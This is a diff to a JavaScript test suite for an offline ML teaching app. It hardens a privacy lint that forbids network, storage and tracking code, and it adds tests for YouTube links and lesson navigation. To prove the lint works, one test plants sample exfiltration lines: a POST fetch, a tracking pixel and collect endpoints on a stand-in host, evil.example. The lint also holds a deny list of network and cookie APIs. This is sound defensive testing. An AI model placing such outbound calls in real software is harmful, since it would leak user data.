@@ -224,6 +224,13 @@ test('the agent gives a clear error instead of crashing on bad input', async () 
 // Fails if any code that could send data off the device or keep it after the tab closes
 // appears in the app. The privacy self-test probes are the only allowed exceptions, and
 // each such line must carry the PRIVACY-SELF-TEST marker.
+/* XML and SVG namespace identifiers look like web addresses and are not. `xmlns="http://
+   schemas.openxmlformats.org/..."` names a vocabulary inside a spreadsheet this tool
+   writes to disk; nothing ever resolves it, and an .xlsx without it does not open. Only
+   these three authorities are exempt, and only as namespace text - the rules against
+   fetching, embedding and loading apply to every file regardless. */
+const NAMESPACE = /https?:\/\/(?:schemas\.openxmlformats\.org|purl\.org|www\.w3\.org)\/[^"'\s]*/g;
+
 test('privacy lint: no network, storage or tracking code', () => {
   const forbidden = [/\bfetch\s*\(/, /XMLHttpRequest/, /WebSocket/, /sendBeacon/, /EventSource/, /localStorage/, /sessionStorage/,
     /indexedDB/, /document\.cookie/, /serviceWorker/, /new\s+Worker/, /importScripts/, /new\s+Image\b/, /https?:\/\//, /\.src\s*=/, /window\.open/, /postMessage/];
@@ -238,6 +245,19 @@ test('privacy lint: no network, storage or tracking code', () => {
          it can reach no further than the page can, but the file it loads and the messages it
          exchanges still have to be local: only this site's own relative .js files, and
          postMessage only between the page and that worker. */
+      /* The academy links out to video explanations. A link is not a request: nothing is
+         fetched, embedded or preloaded, and nothing leaves the browser until a reader
+         clicks. One line in the project is allowed to know a web address, it must build
+         exactly a youtube.com watch URL from an id, and it must carry no way to load
+         anything by itself. */
+      if (line.includes('PRIVACY-EXTERNAL-LINK') && /https:/.test(line)) {
+        const code = line.replace(/(^|[^:'"\w])\/\/.*$/, '$1');
+        assert.ok(/'https:\/\/www\.youtube\.com\/watch\?v='/.test(code),
+          'the one external-link line must build a youtube watch URL and nothing else: ' + line.trim());
+        assert.ok(!/\bfetch\s*\(|XMLHttpRequest|WebSocket|sendBeacon|EventSource|new\s+Image|\.src\s*=|iframe|window\.open|localStorage|document\.cookie/.test(code),
+          'the external-link line must not be able to load or send anything: ' + line.trim());
+        return;
+      }
       if (line.includes('PRIVACY-LOCAL-WORKER')) {
         const code = line.replace(/\/\/.*$/, '');
         assert.ok(!/https?:|\/\//.test(code), 'worker line must not reference another origin: ' + line.trim());
@@ -246,13 +266,38 @@ test('privacy lint: no network, storage or tracking code', () => {
         assert.ok(!/\bfetch\s*\(|XMLHttpRequest|WebSocket|localStorage|document\.cookie/.test(code), 'worker line must not add network or storage: ' + line.trim());
         return;
       }
-      const code = line.replace(/\/\/.*$/, '').replace(/'http:\/\/www\.w3\.org\/2000\/svg'/, '');
+      /* Strip trailing line comments - but not the "//" inside a web address. The
+         original pattern cut everything from the first "//", so `const u = 'https://...'`
+         became `const u = 'https:` and the one rule this lint exists to enforce could not
+         see the one pattern it names. Only treat "//" as a comment when what precedes it
+         is not a colon, a quote or a word character. */
+      const code = line.replace(/(^|[^:'"\w])\/\/.*$/, '$1').replace(NAMESPACE, 'xml-namespace');
       for (const re of forbidden) if (re.test(code)) hits.push(f + ':' + (i + 1) + ' ' + re + ' → ' + line.trim());
     });
   }
   assert.deepStrictEqual(hits, []);
   const marked = fs.readFileSync(path.join(ROOT, 'app.js'), 'utf8').split('\n').filter(l => l.includes('PRIVACY-SELF-TEST'));
   assert.ok(marked.every(l => /example\.com|new Image|document\.cookie/.test(l)), 'self-test lines only probe example.com');
+
+  /* The external-link exception is deliberately hard to spread: one file, one line. If a
+     second file ever claims it, that is a new outbound surface and wants arguing about,
+     not a lint marker copied across. */
+  const linkLines = [];
+  for (const f of files) {
+    fs.readFileSync(path.join(ROOT, f), 'utf8').split('\n').forEach((line, i) => {
+      if (line.includes('PRIVACY-EXTERNAL-LINK') && /https:/.test(line)) linkLines.push(f + ':' + (i + 1));
+    });
+  }
+  /* And pin where namespace text may appear: the spreadsheet writer, the chart drawing
+     code, and the SVG-to-PDF export that has to restate the namespace on a cloned chart. A
+     web address turning up anywhere else is a new outbound surface wearing a disguise. */
+  const nsFiles = files.filter(f => NAMESPACE.test(fs.readFileSync(path.join(ROOT, f), 'utf8')));
+  NAMESPACE.lastIndex = 0;
+  assert.deepStrictEqual(nsFiles.sort(), ['app.js', 'audit.js', 'charts.js'],
+    'only the XML and SVG writers may carry namespace identifiers: ' + nsFiles.join(', '));
+
+  assert.deepStrictEqual(linkLines.map(l => l.split(':')[0]), ['watch.js'],
+    'only watch.js may hold a web address, and it holds exactly one: ' + linkLines.join(', '));
 });
 
 test('privacy lint: every page locks itself down and loads nothing from other servers', () => {
@@ -5378,4 +5423,107 @@ test('a target encoding fitted outside the folds scores a column that means noth
   assert.ok(leaky > 0.3, 'the leak must be visible; the lesson quotes 0.45 and measured ' + leaky.toFixed(2));
   assert.ok(honest < 0, 'encoded inside the folds, a noise column must score no better than the mean; measured ' + honest.toFixed(2));
   assert.ok(leaky - honest > 0.5, 'the gap between the two is the lesson; measured ' + (leaky - honest).toFixed(2));
+});
+
+/* The privacy lint strips trailing line comments before looking for forbidden patterns,
+   and it used to strip from the first "//" it saw. A hardcoded web address contains "//",
+   so `const u = 'https://somewhere/collect'` was cut down to `const u = 'https:` and the
+   rule against web addresses - the one rule this project is built around - could not see
+   the one pattern it names. This test plants exactly that line and fails if the lint goes
+   blind to it again. */
+test('the privacy lint can actually see a hardcoded web address', () => {
+  const strip = line => line.replace(/(^|[^:'"\w])\/\/.*$/, '$1');
+  const url = /https?:\/\//;
+  const planted = [
+    "  const endpoint = 'https://evil.example/collect';",
+    '  const endpoint = "http://evil.example/collect";',
+    "  img.src = 'https://evil.example/pixel.gif';",
+    "  await fetch('https://evil.example/upload', { method: 'POST' });"
+  ];
+  for (const line of planted) {
+    assert.ok(url.test(strip(line)), 'the lint would not see: ' + line.trim());
+  }
+  // A genuine comment that happens to mention an address is still a comment.
+  for (const line of ['  doThing(); // see https://example.com for why', '  // https://example.com']) {
+    assert.ok(!url.test(strip(line)), 'a comment should not be flagged: ' + line.trim());
+  }
+  // And the stripper must still remove ordinary comments, or every line looks like code.
+  assert.strictEqual(strip('  const a = 1; // a note').trim(), 'const a = 1;');
+
+  // The lint source itself must be using this form, not the one that was blind.
+  const lint = fs.readFileSync(path.join(__dirname, 'run-tests.js'), 'utf8');
+  assert.ok(lint.includes("replace(/(^|[^:'\"\\w])\\/\\/.*$/, '$1')"), 'the lint must use the URL-safe comment stripper');
+});
+
+/* Links out of the academy. The rule is narrow on purpose: one file, one address, and
+   every lesson accounted for either by a link whose channel can be named or by an honest
+   blank with the search that would find it. */
+test('the academy links out without opening a door', () => {
+  const W = require(path.join(ROOT, 'watch.js'));
+  const src = fs.readFileSync(path.join(ROOT, 'learn.js'), 'utf8');
+  const watchSrc = fs.readFileSync(path.join(ROOT, 'watch.js'), 'utf8');
+  const html = fs.readFileSync(path.join(ROOT, 'learn.html'), 'utf8');
+  const ids = (src.match(/^    id: '[a-z0-9-]+',/gm) || []).map(s => s.replace(/.*'([^']+)'.*/, '$1'));
+
+  // Every lesson is accounted for, and nothing is listed that is not a lesson.
+  for (const id of ids) {
+    const w = W.WATCH[id];
+    assert.ok(w, 'lesson "' + id + '" is missing from watch.js - every lesson needs a link or a stated blank');
+    assert.ok((w.watch && w.watch.length) || w.search, 'lesson "' + id + '" has neither a link nor a search phrase');
+  }
+  for (const id of Object.keys(W.WATCH)) assert.ok(ids.includes(id), 'watch.js lists "' + id + '", which is not a lesson');
+
+  /* A link nobody can vouch for is worse than a blank, so every one carries the channel it
+     came from and a title a reader can search for when it dies. */
+  const seen = new Set();
+  for (const id of Object.keys(W.WATCH)) {
+    for (const v of W.WATCH[id].watch || []) {
+      assert.ok(/^[A-Za-z0-9_-]{11}$/.test(v.id), id + ' has a malformed video id: ' + v.id);
+      assert.ok(v.title && v.title.length > 8, id + ' has a thin title: ' + v.title);
+      assert.ok(v.channel && v.channel.length > 2, id + ' has no channel named: ' + v.channel);
+      seen.add(v.id);
+    }
+  }
+  assert.ok(seen.size >= 25, 'only ' + seen.size + ' videos; the course is 58 lessons long');
+
+  // The URL builder produces a watch link and nothing else, from the id alone.
+  assert.strictEqual(W.url('aircAruvnKk'), 'https://www.youtube.com/watch?v=aircAruvnKk');
+  assert.ok(!/\?v=.*&/.test(W.url('abc')), 'no tracking parameters may be appended');
+  assert.strictEqual(W.url('a b&c=d'), 'https://www.youtube.com/watch?v=a%20b%26c%3Dd');
+
+  /* Nothing may be embedded or preloaded. An iframe, a thumbnail or a preconnect would
+     contact the site on page load, which is the thing a plain link specifically does not
+     do - and the page would be making the request, not the reader. */
+  for (const bad of [/<iframe/i, /youtube-nocookie/, /img\.youtube/, /i\.ytimg/, /preconnect/, /dns-prefetch/, /embed\//]) {
+    assert.ok(!bad.test(watchSrc + src), 'the academy must not embed or preload anything: ' + bad);
+  }
+  assert.ok(!/youtube/i.test(html), 'learn.html must not reference the site at all');
+  // Links open away from the tool without handing it a window reference.
+  assert.ok(/rel="noopener noreferrer"/.test(src), 'external links need rel="noopener noreferrer"');
+  assert.ok(/target="_blank"/.test(src), 'external links should not replace the lesson');
+  // And the page says, in the lesson, that these leave and need a connection.
+  assert.ok(/leave ML Agent and need an internet connection/.test(src), 'the block must say what it costs');
+  assert.ok(/nothing is sent anywhere unless you click/.test(src), 'and what it does not cost');
+  // The check date is printed, because "verified" without a date is not a claim.
+  assert.ok(/CHECKED/.test(src) && /\d{4}/.test(W.CHECKED), 'the date the links were checked must be shown');
+  // The build ships it.
+  assert.ok(/watch\.js/.test(fs.readFileSync(path.join(ROOT, 'package.sh'), 'utf8')), 'package.sh must copy watch.js');
+});
+
+/* Page by page. The pair of links at the foot of a lesson is easy to miss under a long
+   article, so the same move has to be reachable without scrolling, and from the keyboard. */
+test('a reader can move through the course one lesson at a time', () => {
+  const src = fs.readFileSync(path.join(ROOT, 'learn.js'), 'utf8');
+  assert.ok(/function topNav/.test(src), 'there must be a navigation bar at the top of each lesson');
+  assert.ok(/Lesson ' \+ \(i \+ 1\) \+ ' of ' \+ LESSONS\.length/.test(src), 'it must say where you are in the course');
+  assert.ok(/class="lesson-bar"/.test(src), 'and show progress through it');
+  assert.ok(/lesson-nav/.test(src), 'the pair at the foot of the lesson stays');
+  // Arrow keys, without stealing them from a focused control or a browser shortcut.
+  assert.ok(/ArrowLeft|ArrowRight/.test(src), 'arrow keys must turn the page');
+  assert.ok(/altKey \|\| e\.ctrlKey \|\| e\.metaKey \|\| e\.shiftKey/.test(src), 'modified arrow keys belong to the browser');
+  assert.ok(/input, select, textarea/.test(src), 'arrow keys inside a control belong to the control');
+  // The progress bar is drawn, not styled: the page forbids inline styles.
+  const css = fs.readFileSync(path.join(ROOT, 'style.css'), 'utf8');
+  assert.ok(/\.lesson-bar \.bar-on/.test(css), 'the progress bar needs a fill colour from the stylesheet');
+  assert.ok(!/style="/.test(src), 'no inline styles anywhere in the lessons');
 });
